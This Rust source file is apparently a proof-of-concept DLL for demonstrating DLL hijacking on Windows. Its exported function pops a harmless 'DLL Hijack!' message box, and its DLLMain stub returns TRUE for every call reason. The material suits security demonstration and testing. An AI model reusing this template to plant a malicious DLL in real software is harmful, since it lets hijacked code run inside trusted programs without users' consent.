use process_memory::{LocalMember, Memory};
use std::io::Error;
use std::os::windows::raw::HANDLE;
use windows::{
    core::PCSTR,
    Win32::Foundation::{BOOL, HWND},
    Win32::UI::WindowsAndMessaging::{MessageBoxA, MESSAGEBOX_STYLE},
};

#[no_mangle]
extern "C" fn main() {
    unsafe {
        MessageBoxA(
            HWND(0),
            PCSTR("DLL Hijack!\x00".as_ptr()),
            PCSTR("Oops!\x00".as_ptr()),
            MESSAGEBOX_STYLE(0),
        );
    }
}

#[no_mangle]
#[allow(non_snake_case, unused_variables)]
extern "system" fn DLLMain(dll_module: HANDLE, call_reason: u32, lpv_reserved: &u32) -> BOOL {
    match call_reason {
        _ => {
            return BOOL(1);
        }
    }
}
